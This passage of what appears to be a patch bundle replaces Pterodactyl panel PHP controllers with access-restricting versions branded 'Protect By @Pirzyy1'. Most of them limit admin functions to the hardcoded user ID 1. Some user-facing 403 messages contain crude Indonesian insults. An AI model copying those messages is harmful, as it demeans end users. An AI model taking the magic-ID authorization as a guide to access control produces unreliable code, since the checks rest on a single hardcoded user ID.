    use AvailableLanguages;

    /**
     * UserController constructor.
     */
    public function __construct(
        protected AlertsMessageBag $alert,
        protected UserCreationService $creationService,
        protected UserDeletionService $deletionService,
        protected Translator $translator,
        protected UserUpdateService $updateService,
        protected UserRepositoryInterface $repository,
        protected ViewFactory $view
    ) {
    }

    /**
     * Display user index page.
     */
public function index(Request $request): View
{
    $authUser = $request->user();

    $query = User::query()
        ->select('users.*')
        ->selectRaw('COUNT(DISTINCT(subusers.id)) as subuser_of_count')
        ->selectRaw('COUNT(DISTINCT(servers.id)) as servers_count')
        ->leftJoin('subusers', 'subusers.user_id', '=', 'users.id')
        ->leftJoin('servers', 'servers.owner_id', '=', 'users.id')
        ->groupBy('users.id');

    // Jika bukan admin ID 1, hanya tampilkan dirinya sendiri
    if ($authUser->id !== 1) {
        $query->where('users.id', $authUser->id);
    }

    $users = QueryBuilder::for($query)
        ->allowedFilters(['username', 'email', 'uuid'])
        ->allowedSorts(['id', 'uuid'])
        ->paginate(50);

    return $this->view->make('admin.users.index', ['users' => $users]);
}

    /**
     * Display new user page.
     */
    public function create(): View
    {
        return $this->view->make('admin.users.new', [
            'languages' => $this->getAvailableLanguages(true),
        ]);
    }

    /**
     * Display user view page.
     */
    public function view(User $user): View
    {
        return $this->view->make('admin.users.view', [
            'user' => $user,
            'languages' => $this->getAvailableLanguages(true),
        ]);
    }

    /**
     * Delete a user from the system.
     *
     * @throws \\Exception
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     */
public function delete(Request $request, User $user): RedirectResponse
{
    $authUser = $request->user();

    // ❌ Jika bukan admin ID 1 -> larang delete user manapun
    if ($authUser->id !== 1) {
        throw new DisplayException("🚫 Akses ditolak: hanya admin ID 1 yang dapat menghapus user! ©Protect By @Pirzyy1");
    }

    // ❌ Admin ID 1 tidak boleh hapus dirinya sendiri
    if ($authUser->id === $user->id) {
        throw new DisplayException("❌ Tidak bisa menghapus akun Anda sendiri.");
    }

    // Lanjut hapus user
    $this->deletionService->handle($user);

    $this->alert->success("🗑️ User berhasil dihapus.")->flash();
    return redirect()->route('admin.users');
}

    /**
     * Create a user.
     */
    public function store(NewUserFormRequest $request): RedirectResponse
    {
        $authUser = $request->user();
        $data = $request->normalize();

        // Jika user bukan admin ID 1 dan mencoba membuat user admin
        if ($authUser->id !== 1 && isset($data['root_admin']) && $data['root_admin'] == true) {
            throw new DisplayException("🚫 Akses ditolak: Hanya admin ID 1 yang dapat membuat user admin! ©Protect By @Pirzyy1.");
        }

        // Semua user selain ID 1 akan selalu membuat user biasa
        if ($authUser->id !== 1) {
            $data['root_admin'] = false;
        }

        // Buat user baru
        $user = $this->creationService->handle($data);

        $this->alert->success("✅ Akun user berhasil dibuat (level: user biasa).")->flash();
        return redirect()->route('admin.users.view', $user->id);
    }


    /**
     * Update a user on the system.
     *
     * @throws \\Pterodactyl\\Exceptions\\Model\\DataValidationException
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
    public function update(UserFormRequest $request, User $user): RedirectResponse
    {
        $restrictedFields = ['email', 'first_name', 'last_name', 'password'];

        foreach ($restrictedFields as $field) {
            if ($request->filled($field) && $request->user()->id !== 1) {
                throw new DisplayException("⚠️ Data hanya bisa diubah oleh admin ID 1. ©Protect By @Pirzyy1");
            }
        }

        if ($user->root_admin && $request->user()->id !== 1) {
            throw new DisplayException("🚫 Akses ditolak: Hanya admin ID 1 yang dapat menurunkan hak admin user ini! ©Protect By @Pirzyy1.");
        }

        if ($request->user()->id !== 1 && $request->user()->id !== $user->id) {
            throw new DisplayException("🚫 Akses ditolak: Hanya admin ID 1 yang dapat mengubah data user lain! ©Protect By @Pirzyy1.");
        }

        // Hapus root_admin dari request agar user biasa tidak bisa ubah level
        $data = $request->normalize();
        if ($request->user()->id !== 1) {
            unset($data['root_admin']);
        }

        $this->updateService
            ->setUserLevel(User::USER_LEVEL_ADMIN)
            ->handle($user, $data);

        $this->alert->success(trans('admin/user.notices.account_updated'))->flash();

        return redirect()->route('admin.users.view', $user->id);
    }

    /**
     * Get a JSON response of users on the system.
     */
    public function json(Request $request): Model|Collection
    {
        $authUser = $request->user();
        $query = QueryBuilder::for(User::query())->allowedFilters(['email']);

        if ($authUser->id !== 1) {
            $query->where('id', $authUser->id);
        }

        $users = $query->paginate(25);

        if ($request->query('user_id')) {
            $user = User::query()->findOrFail($request->input('user_id'));
            if ($authUser->id !== 1 && $authUser->id !== $user->id) {
                throw new DisplayException("🚫 Akses ditolak: Hanya admin ID 1 yang dapat melihat data user lain! ©Protect By @Pirzyy1.");
            }
            $user->md5 = md5(strtolower($user->email));
            return $user;
        }

        return $users->map(function ($item) {
            $item->md5 = md5(strtolower($item->email));
            return $item;
        });
    }
}`
      },      
      {
        name: "PROTECT3 (ANTI INTIP LOCATION)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/LocationController.php",
        file: "LocationController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin;

use Illuminate\\View\\View;
use Illuminate\\Http\\RedirectResponse;
use Illuminate\\Support\\Facades\\Auth;
use Pterodactyl\\Models\\Location;
use Prologue\\Alerts\\AlertsMessageBag;
use Illuminate\\View\\Factory as ViewFactory;
use Pterodactyl\\Exceptions\\DisplayException;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Http\\Requests\\Admin\\LocationFormRequest;
use Pterodactyl\\Services\\Locations\\LocationUpdateService;
use Pterodactyl\\Services\\Locations\\LocationCreationService;
use Pterodactyl\\Services\\Locations\\LocationDeletionService;
use Pterodactyl\\Contracts\\Repository\\LocationRepositoryInterface;

class LocationController extends Controller
{
    public function __construct(
        protected AlertsMessageBag $alert,
        protected LocationCreationService $creationService,
        protected LocationDeletionService $deletionService,
        protected LocationRepositoryInterface $repository,
        protected LocationUpdateService $updateService,
        protected ViewFactory $view
    ) {
    }

    public function index(): View
    {
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak: Hanya admin utama (ID 1) yang dapat mengakses menu Location! ©Protect By @Pirzyy1.');
        }

        return $this->view->make('admin.locations.index', [
            'locations' => $this->repository->getAllWithDetails(),
        ]);
    }

    public function view(int $id): View
    {
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak: Hanya admin utama (ID 1) yang dapat mengakses menu Location! ©Protect By @Pirzyy1.');
        }

        return $this->view->make('admin.locations.view', [
            'location' => $this->repository->getWithNodes($id),
        ]);
    }

    public function create(LocationFormRequest $request): RedirectResponse
    {
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak: Hanya admin utama (ID 1) yang dapat mengakses menu Location! ©Protect By @Pirzyy1.');
        }

        $location = $this->creationService->handle($request->normalize());
        $this->alert->success('Location was created successfully.')->flash();

        return redirect()->route('admin.locations.view', $location->id);
    }

    public function update(LocationFormRequest $request, Location $location): RedirectResponse
    {
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak: Hanya admin utama (ID 1) yang dapat mengakses menu Location! ©Protect By @Pirzyy1.');
        }

        if ($request->input('action') === 'delete') {
            return $this->delete($location);
        }

        $this->updateService->handle($location->id, $request->normalize());
        $this->alert->success('Location was updated successfully.')->flash();

        return redirect()->route('admin.locations.view', $location->id);
    }

    public function delete(Location $location): RedirectResponse
    {
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak: Hanya admin utama (ID 1) yang dapat mengakses menu Location! ©Protect By @Pirzyy1.');
        }

        try {
            $this->deletionService->handle($location->id);
            return redirect()->route('admin.locations');
        } catch (DisplayException $ex) {
            $this->alert->danger($ex->getMessage())->flash();
        }

        return redirect()->route('admin.locations.view', $location->id);
    }
}`
      },
      {
        name: "PROTECT4 (ANTI INTIP NODES)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/Nodes/NodeController.php",
        file: "NodeController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin\\Nodes;

use Illuminate\\View\\View;
use Illuminate\\Http\\Request;
use Illuminate\\Http\\RedirectResponse;
use Illuminate\\Support\\Facades\\Auth;
use Illuminate\\Contracts\\View\\Factory as ViewFactory;
use Pterodactyl\\Models\\Node;
use Spatie\\QueryBuilder\\QueryBuilder;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Http\\Requests\\Admin\\NodeFormRequest;
use Pterodactyl\\Services\\Nodes\\NodeUpdateService;
use Pterodactyl\\Services\\Nodes\\NodeCreationService;
use Pterodactyl\\Services\\Nodes\\NodeDeletionService;
use Pterodactyl\\Contracts\\Repository\\NodeRepositoryInterface;
use Prologue\\Alerts\\AlertsMessageBag;
use Pterodactyl\\Exceptions\\DisplayException;

class NodeController extends Controller
{
    public function __construct(
        protected ViewFactory $view,
        protected NodeRepositoryInterface $repository,
        protected NodeCreationService $creationService,
        protected NodeUpdateService $updateService,
        protected NodeDeletionService $deletionService,
        protected AlertsMessageBag $alert
    ) {
    }

    private function checkAdminAccess(): void
    {
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak! Hanya Admin utama (ID 1) yang dapat mengakses menu Nodes. 
©Protect By @Pirzyy1');
        }
    }

    public function index(Request $request): View
    {
        $this->checkAdminAccess();

        $nodes = QueryBuilder::for(
            Node::query()->with('location')->withCount('servers')
        )
            ->allowedFilters(['uuid', 'name'])
            ->allowedSorts(['id'])
            ->paginate(25);

        return $this->view->make('admin.nodes.index', ['nodes' => $nodes]);
    }

    public function create(): View
    {
        $this->checkAdminAccess();
        return $this->view->make('admin.nodes.new');
    }

    public function store(NodeFormRequest $request): RedirectResponse
    {
        $this->checkAdminAccess();

        $node = $this->creationService->handle($request->normalize());
        $this->alert->success('✅ Node berhasil dibuat.')->flash();

        return redirect()->route('admin.nodes.view', $node->id);
    }

    public function view(int $id): View
    {
        $this->checkAdminAccess();

        $node = $this->repository->getByIdWithAllocations($id);
        return $this->view->make('admin.nodes.view', ['node' => $node]);
    }

    public function edit(int $id): View
    {
        $this->checkAdminAccess();

        $node = $this->repository->getById($id);
        return $this->view->make('admin.nodes.edit', ['node' => $node]);
    }

    public function update(NodeFormRequest $request, int $id): RedirectResponse
    {
        $this->checkAdminAccess();

        $this->updateService->handle($id, $request->normalize());
        $this->alert->success('✅ Node berhasil diperbarui.')->flash();

        return redirect()->route('admin.nodes.view', $id);
    }

    public function delete(int $id): RedirectResponse
    {
        $this->checkAdminAccess();

        try {
            $this->deletionService->handle($id);
            $this->alert->success('🗑️ Node berhasil dihapus.')->flash();
            return redirect()->route('admin.nodes');
        } catch (DisplayException $ex) {
            $this->alert->danger($ex->getMessage())->flash();
        }

        return redirect()->route('admin.nodes.view', $id);
    }
}`
      },
      {
        name: "PROTECT5 (ANTI INTIP NEST)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/Nests/NestController.php",
        file: "NestController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin\\Nests;

use Illuminate\\View\\View;
use Illuminate\\Http\\RedirectResponse;
use Illuminate\\Support\\Facades\\Auth;
use Prologue\\Alerts\\AlertsMessageBag;
use Illuminate\\View\\Factory as ViewFactory;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Services\\Nests\\NestUpdateService;
use Pterodactyl\\Services\\Nests\\NestCreationService;
use Pterodactyl\\Services\\Nests\\NestDeletionService;
use Pterodactyl\\Contracts\\Repository\\NestRepositoryInterface;
use Pterodactyl\\Http\\Requests\\Admin\\Nest\\StoreNestFormRequest;
use Pterodactyl\\Exceptions\\DisplayException;

class NestController extends Controller
{
    public function __construct(
        protected AlertsMessageBag $alert,
        protected NestCreationService $nestCreationService,
        protected NestDeletionService $nestDeletionService,
        protected NestRepositoryInterface $repository,
        protected NestUpdateService $nestUpdateService,
        protected ViewFactory $view
    ) {
    }

    /**
     * 🔒 Cek akses: hanya admin ID 1 yang boleh lanjut.
     */
    private function checkAdminAccess(): void
    {
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak! Hanya Admin utama (ID 1) yang dapat membuka menu Nests. 
©Protect By @Pirzyy1');
        }
    }

    public function index(): View
    {
        $this->checkAdminAccess();

        return $this->view->make('admin.nests.index', [
            'nests' => $this->repository->getWithCounts(),
        ]);
    }

    public function create(): View
    {
        $this->checkAdminAccess();
        return $this->view->make('admin.nests.new');
    }

    public function store(StoreNestFormRequest $request): RedirectResponse
    {
        $this->checkAdminAccess();
        $nest = $this->nestCreationService->handle($request->normalize());
        $this->alert->success('✅ Nest berhasil dibuat.')->flash();
        return redirect()->route('admin.nests.view', $nest->id);
    }

    public function view(int $nest): View
    {
        $this->checkAdminAccess();
        return $this->view->make('admin.nests.view', [
            'nest' => $this->repository->getWithEggServers($nest),
        ]);
    }

    public function update(StoreNestFormRequest $request, int $nest): RedirectResponse
    {
        $this->checkAdminAccess();
        $this->nestUpdateService->handle($nest, $request->normalize());
        $this->alert->success('✅ Nest berhasil diperbarui.')->flash();
        return redirect()->route('admin.nests.view', $nest);
    }

    public function destroy(int $nest): RedirectResponse
    {
        $this->checkAdminAccess();
        try {
            $this->nestDeletionService->handle($nest);
            $this->alert->success('🗑️ Nest berhasil dihapus.')->flash();
            return redirect()->route('admin.nests');
        } catch (DisplayException $ex) {
            $this->alert->danger($ex->getMessage())->flash();
        }
        return redirect()->route('admin.nests.view', $nest);
    }
}`
      },
      {
        name: "PROTECT6 (ANTI INTIP SETTINGS)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/Settings/IndexController.php",
        file: "IndexController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin\\Settings;

use Illuminate\\View\\View;
use Illuminate\\Http\\RedirectResponse;
use Illuminate\\Support\\Facades\\Auth;
use Prologue\\Alerts\\AlertsMessageBag;
use Illuminate\\Contracts\\Console\\Kernel;
use Illuminate\\View\\Factory as ViewFactory;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Traits\\Helpers\\AvailableLanguages;
use Pterodactyl\\Services\\Helpers\\SoftwareVersionService;
use Pterodactyl\\Contracts\\Repository\\SettingsRepositoryInterface;
use Pterodactyl\\Http\\Requests\\Admin\\Settings\\BaseSettingsFormRequest;

class IndexController extends Controller
{
    use AvailableLanguages;

    public function __construct(
        private AlertsMessageBag $alert,
        private Kernel $kernel,
        private SettingsRepositoryInterface $settings,
        private SoftwareVersionService $versionService,
        private ViewFactory $view
    ) {
    }

    public function index(): View
    {
        // 🔒 Anti akses menu Settings selain user ID 1
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak: Hanya admin ID 1 yang dapat membuka menu Settings! ©Protect By @Pirzyy1.');
        }

        return $this->view->make('admin.settings.index', [
            'version' => $this->versionService,
            'languages' => $this->getAvailableLanguages(true),
        ]);
    }

    public function update(BaseSettingsFormRequest $request): RedirectResponse
    {
        // 🔒 Anti akses update settings selain user ID 1
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak: Hanya admin ID 1 yang dapat update menu Settings! ©Protect By @Pirzyy1.');
        }

        foreach ($request->normalize() as $key => $value) {
            $this->settings->set('settings::' . $key, $value);
        }

        $this->kernel->call('queue:restart');
        $this->alert->success(
            'Panel settings have been updated successfully and the queue worker was restarted to apply these changes.'
        )->flash();

        return redirect()->route('admin.settings');
    }
}`
      },
      {
        name: "PROTECT7 (ANTI AKSES FILE & DOWNLOAD)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Api/Client/Servers/FileController.php",
        file: "FileController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Api\\Client\\Servers;

use Carbon\\CarbonImmutable;
use Illuminate\\Http\\Response;
use Illuminate\\Http\\JsonResponse;
use Illuminate\\Support\\Facades\\Auth;
use Pterodactyl\\Models\\Server;
use Pterodactyl\\Facades\\Activity;
use Pterodactyl\\Services\\Nodes\\NodeJWTService;
use Pterodactyl\\Repositories\\Wings\\DaemonFileRepository;
use Pterodactyl\\Transformers\\Api\\Client\\FileObjectTransformer;
use Pterodactyl\\Http\\Controllers\\Api\\Client\\ClientApiController;
use Pterodactyl\\Http\\Requests\\Api\\Client\\Servers\\Files\\{
    CopyFileRequest, PullFileRequest, ListFilesRequest, ChmodFilesRequest,
    DeleteFileRequest, RenameFileRequest, CreateFolderRequest,
    CompressFilesRequest, DecompressFilesRequest, GetFileContentsRequest, WriteFileContentRequest
};

class FileController extends ClientApiController
{
    public function __construct(
        private NodeJWTService $jwtService,
        private DaemonFileRepository $fileRepository
    ) {
        parent::__construct();
    }

    /**
     * 🔒 pirzy DoubleProtect v3.3 — Cegah akses file server orang.
     */
    private function checkServerAccess($request, Server $server)
    {
        $authUser = Auth::user();

        if (!$authUser) {
            abort(403, '🚫 Tidak dapat memverifikasi pengguna. Silakan login ulang. ©pirzyProtect ');
        }

        if ($authUser->id === 1) {
            return;
        }

        if ($authUser->id !== $server->owner_id) {
            abort(403, "🚫 Gagal Mengintip Server Orang, Balik ke Server lu anjing nggak usah ngintip² \n©Protect By @Pirzyy1");
        }
    }

    public function directory(ListFilesRequest $request, Server $server): array
    {
        $this->checkServerAccess($request, $server);

        $contents = $this->fileRepository
            ->setServer($server)
            ->getDirectory($request->get('directory') ?? '/');

        return $this->fractal->collection($contents)
            ->transformWith($this->getTransformer(FileObjectTransformer::class))
            ->toArray();
    }

    public function contents(GetFileContentsRequest $request, Server $server): Response
    {
        $this->checkServerAccess($request, $server);

        $response = $this->fileRepository->setServer($server)->getContent(
            $request->get('file'),
            config('pterodactyl.files.max_edit_size')
        );

        Activity::event('server:file.read')->property('file', $request->get('file'))->log();

        return new Response($response, Response::HTTP_OK, ['Content-Type' => 'text/plain']);
    }

    public function download(GetFileContentsRequest $request, Server $server): array
    {
        $this->checkServerAccess($request, $server);

        $token = $this->jwtService
            ->setExpiresAt(CarbonImmutable::now()->addMinutes(15))
            ->setUser($request->user())
            ->setClaims([
                'file_path' => rawurldecode($request->get('file')),
                'server_uuid' => $server->uuid,
            ])
            ->handle($server->node, $request->user()->id . $server->uuid);

        Activity::event('server:file.download')->property('file', $request->get('file'))->log();

        return [
            'object' => 'signed_url',
            'attributes' => [
                'url' => sprintf('%s/download/file?token=%s', $server->node->getConnectionAddress(), $token->toString()),
            ],
        ];
    }

    public function write(WriteFileContentRequest $request, Server $server): JsonResponse
    {
        $this->checkServerAccess($request, $server);

        $this->fileRepository->setServer($server)->putContent($request->get('file'), $request->getContent());
        Activity::event('server:file.write')->property('file', $request->get('file'))->log();

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }

    public function create(CreateFolderRequest $request, Server $server): JsonResponse
    {
        $this->checkServerAccess($request, $server);

        $this->fileRepository->setServer($server)->createDirectory($request->input('name'), $request->input('root', '/'));

        Activity::event('server:file.create-directory')
            ->property('name', $request->input('name'))
            ->property('directory', $request->input('root'))
            ->log();

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }

    public function rename(RenameFileRequest $request, Server $server): JsonResponse
    {
        $this->checkServerAccess($request, $server);

        $this->fileRepository->setServer($server)->renameFiles($request->input('root'), $request->input('files'));

        Activity::event('server:file.rename')
            ->property('directory', $request->input('root'))
            ->property('files', $request->input('files'))
            ->log();

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }

    public function copy(CopyFileRequest $request, Server $server): JsonResponse
    {
        $this->checkServerAccess($request, $server);

        $this->fileRepository->setServer($server)->copyFile($request->input('location'));
        Activity::event('server:file.copy')->property('file', $request->input('location'))->log();

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }

    public function compress(CompressFilesRequest $request, Server $server): array
    {
        $this->checkServerAccess($request, $server);

        $file = $this->fileRepository->setServer($server)->compressFiles(
            $request->input('root'),
            $request->input('files')
        );

        Activity::event('server:file.compress')
            ->property('directory', $request->input('root'))
            ->property('files', $request->input('files'))
            ->log();

        return $this->fractal->item($file)
            ->transformWith($this->getTransformer(FileObjectTransformer::class))
            ->toArray();
    }

    public function decompress(DecompressFilesRequest $request, Server $server): JsonResponse
    {
        $this->checkServerAccess($request, $server);

        set_time_limit(300);

        $this->fileRepository->setServer($server)->decompressFile(
            $request->input('root'),
            $request->input('file')
        );

        Activity::event('server:file.decompress')
            ->property('directory', $request->input('root'))
            ->property('files', $request->input('file'))
            ->log();

        return new JsonResponse([], JsonResponse::HTTP_NO_CONTENT);
    }

    public function delete(DeleteFileRequest $request, Server $server): JsonResponse
    {
        $this->checkServerAccess($request, $server);

        $this->fileRepository->setServer($server)->deleteFiles(
            $request->input('root'),
            $request->input('files')
        );

        Activity::event('server:file.delete')
            ->property('directory', $request->input('root'))
            ->property('files', $request->input('files'))
            ->log();

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }

    public function chmod(ChmodFilesRequest $request, Server $server): JsonResponse
    {
        $this->checkServerAccess($request, $server);

        $this->fileRepository->setServer($server)->chmodFiles(
            $request->input('root'),
            $request->input('files')
        );

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }

    public function pull(PullFileRequest $request, Server $server): JsonResponse
    {
        $this->checkServerAccess($request, $server);

        $this->fileRepository->setServer($server)->pull(
            $request->input('url'),
            $request->input('directory'),
            $request->safe(['filename', 'use_header', 'foreground'])
        );

        Activity::event('server:file.pull')
            ->property('directory', $request->input('directory'))
            ->property('url', $request->input('url'))
            ->log();

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }
}`
      },
      {
        name: "PROTECT8 (ANTI INTIP SERVER)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Api/Client/Servers/ServerController.php",
        file: "ServerController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Api\\Client\\Servers;

use Illuminate\\Support\\Facades\\Auth;
use Pterodactyl\\Models\\Server;
use Pterodactyl\\Transformers\\Api\\Client\\ServerTransformer;
use Pterodactyl\\Services\\Servers\\GetUserPermissionsService;
use Pterodactyl\\Http\\Controllers\\Api\\Client\\ClientApiController;
use Pterodactyl\\Http\\Requests\\Api\\Client\\Servers\\GetServerRequest;

class ServerController extends ClientApiController
{
    public function __construct(private GetUserPermissionsService $permissionsService)
    {
        parent::__construct();
    }

    /**
     * 🧱 pirzy Anti-Intip Server Protect v2.5
     * Hanya Admin utama (ID 1) atau pemilik server yang dapat melihat detail server.
     */
    public function index(GetServerRequest $request, Server $server): array
    {
        $authUser = Auth::user();

        if (!$authUser) {
            abort(403, '🚫 Tidak dapat memverifikasi pengguna. Silakan login ulang.');
        }

        if ($authUser->id !== 1 && (int) $server->owner_id !== (int) $authUser->id) {
            abort(403, '🚫 Gagal Mengintip Server Orang, Balik ke Server lu anjing nggak usah ngintip² \n©Protect By @Pirzyy1');
        }

        return $this->fractal->item($server)
            ->transformWith($this->getTransformer(ServerTransformer::class))
            ->addMeta([
                'is_server_owner' => $authUser->id === $server->owner_id,
                'user_permissions' => $this->permissionsService->handle($server, $authUser),
            ])
            ->toArray();
    }
}`
      },
      {
        name: "PROTECT9 (ANTI INTIP APIKEY)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/ApiController.php",
        file: "ApiController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin;

use Illuminate\\View\\View;
use Illuminate\\Http\\Request;
use Illuminate\\Http\\Response;
use Illuminate\\Support\\Facades\\Auth;
use Pterodactyl\\Models\\ApiKey;
use Illuminate\\Http\\RedirectResponse;
use Prologue\\Alerts\\AlertsMessageBag;
use Pterodactyl\\Services\\Acl\\Api\\AdminAcl;
use Illuminate\\View\\Factory as ViewFactory;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Services\\Api\\KeyCreationService;
use Pterodactyl\\Contracts\\Repository\\ApiKeyRepositoryInterface;
use Pterodactyl\\Http\\Requests\\Admin\\Api\\StoreApplicationApiKeyRequest;

class ApiController extends Controller
{
    public function __construct(
        private AlertsMessageBag $alert,
        private ApiKeyRepositoryInterface $repository,
        private KeyCreationService $keyCreationService,
        private ViewFactory $view,
    ) {}

    /**
     * 🧱 pirzy DoubleProtect v2.3 — Anti Intip APIKEY
     * Hanya Admin utama (ID 1) yang dapat mengakses menu APIKEY.
     */
    private function protectAccess()
    {
        $user = Auth::user();
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Kasihan gabisa yaaa? 😹 Hanya Admin utama (ID 1) yang dapat mengakses halaman APIKEY! ©Protect By @Pirzyy1');
        }
    }

    public function index(Request $request): View
    {
        $this->protectAccess();

        return $this->view->make('admin.api.index', [
            'keys' => $this->repository->getApplicationKeys($request->user()),
        ]);
    }

    public function create(): View
    {
        $this->protectAccess();

        $resources = AdminAcl::getResourceList();
        sort($resources);

        return $this->view->make('admin.api.new', [
            'resources' => $resources,
            'permissions' => [
                'r' => AdminAcl::READ,
                'rw' => AdminAcl::READ | AdminAcl::WRITE,
                'n' => AdminAcl::NONE,
            ],
        ]);
    }

    public function store(StoreApplicationApiKeyRequest $request): RedirectResponse
    {
        $this->protectAccess();

        $this->keyCreationService->setKeyType(ApiKey::TYPE_APPLICATION)->handle([
            'memo' => $request->input('memo'),
            'user_id' => $request->user()->id,
        ], $request->getKeyPermissions());

        $this->alert->success('✅ API Key baru berhasil dibuat untuk Admin utama.')->flash();
        return redirect()->route('admin.api.index');
    }

    public function delete(Request $request, string $identifier): Response
    {
        $this->protectAccess();
        $this->repository->deleteApplicationKey($request->user(), $identifier);

        return response('', 204);
    }
}`
      },
      {
        name: "PROTECT10 (ANTI CREATE CAPIKEY)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Api/Client/ApiKeyController.php",
        file: "ApiKeyController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Api\\Client;

use Pterodactyl\\Models\\ApiKey;
use Illuminate\\Http\\JsonResponse;
use Pterodactyl\\Facades\\Activity;
use Pterodactyl\\Exceptions\\DisplayException;
use Pterodactyl\\Http\\Requests\\Api\\Client\\ClientApiRequest;
use Pterodactyl\\Transformers\\Api\\Client\\ApiKeyTransformer;
use Pterodactyl\\Http\\Requests\\Api\\Client\\Account\\StoreApiKeyRequest;

class ApiKeyController extends ClientApiController
{
    /**
     * 🧱 pirzy Security Layer — Anti Akses Ilegal
     * Hanya Admin utama (ID 1) yang boleh mengatur, membuat, dan menghapus API Key.
     */
    private function protectAccess($user)
    {
        if (!$user || $user->id !== 1) {
            abort(403, '🚫 Akses ditolak: Hanya Admin ID 1 yang dapat mengelola API Key! ©Protect By @Pirzyy1.');
        }
    }

    /**
     * 📜 Menampilkan semua API Key (hanya Admin ID 1)
     */
    public function index(ClientApiRequest $request): array
    {
        $user = $request->user();
        $this->protectAccess($user);

        return $this->fractal->collection($user->apiKeys)
            ->transformWith($this->getTransformer(ApiKeyTransformer::class))
            ->toArray();
    }

    /**
     * 🧩 Membuat API Key baru (hanya Admin ID 1)
     *
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     */
    public function store(StoreApiKeyRequest $request): array
    {
        $user = $request->user();
        $this->protectAccess($user);

        if ($user->apiKeys->count() >= 25) {
            throw new DisplayException('❌ Batas maksimal API Key tercapai (maksimum 25).');
        }

        $token = $user->createToken(
            $request->input('description'),
            $request->input('allowed_ips')
        );

        Activity::event('user:api-key.create')
            ->subject($token->accessToken)
            ->property('identifier', $token->accessToken->identifier)
            ->log();

        return $this->fractal->item($token->accessToken)
            ->transformWith($this->getTransformer(ApiKeyTransformer::class))
            ->addMeta(['secret_token' => $token->plainTextToken])
            ->toArray();
    }

    /**
     * ❌ Menghapus API Key (hanya Admin ID 1)
     */
    public function delete(ClientApiRequest $request, string $identifier): JsonResponse
    {
        $user = $request->user();
        $this->protectAccess($user);

        /** @var \\Pterodactyl\\Models\\ApiKey $key */
        $key = $user->apiKeys()
            ->where('key_type', ApiKey::TYPE_ACCOUNT)
            ->where('identifier', $identifier)
            ->firstOrFail();

        Activity::event('user:api-key.delete')
            ->property('identifier', $key->identifier)
            ->log();

        $key->delete();

        return new JsonResponse([], JsonResponse::HTTP_NO_CONTENT);
    }
}`
      },
      {
        name: "PROTECT11 (ANTI INTIP DATABASE)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/DatabaseController.php",
        file: "DatabaseController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin;

use Exception;
use Illuminate\\View\\View;
use Illuminate\\Http\\RedirectResponse;
use Prologue\\Alerts\\AlertsMessageBag;
use Illuminate\\View\\Factory as ViewFactory;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Models\\DatabaseHost;
use Pterodactyl\\Http\\Requests\\Admin\\DatabaseHostFormRequest;
use Pterodactyl\\Services\\Databases\\Hosts\\HostCreationService;
use Pterodactyl\\Services\\Databases\\Hosts\\HostDeletionService;
use Pterodactyl\\Services\\Databases\\Hosts\\HostUpdateService;
use Pterodactyl\\Contracts\\Repository\\DatabaseRepositoryInterface;
use Pterodactyl\\Contracts\\Repository\\LocationRepositoryInterface;
use Pterodactyl\\Contracts\\Repository\\DatabaseHostRepositoryInterface;

class DatabaseController extends Controller
{
    public function __construct(
        private AlertsMessageBag $alert,
        private DatabaseHostRepositoryInterface $repository,
        private DatabaseRepositoryInterface $databaseRepository,
        private HostCreationService $creationService,
        private HostDeletionService $deletionService,
        private HostUpdateService $updateService,
        private LocationRepositoryInterface $locationRepository,
        private ViewFactory $view
    ) {}

    /**
     * 🔒 Proteksi: hanya admin ID 1 yang boleh mengakses Database Section
     */
    private function checkAccess()
    {
        $user = auth()->user();

        if (!$user || $user->id !== 1) {
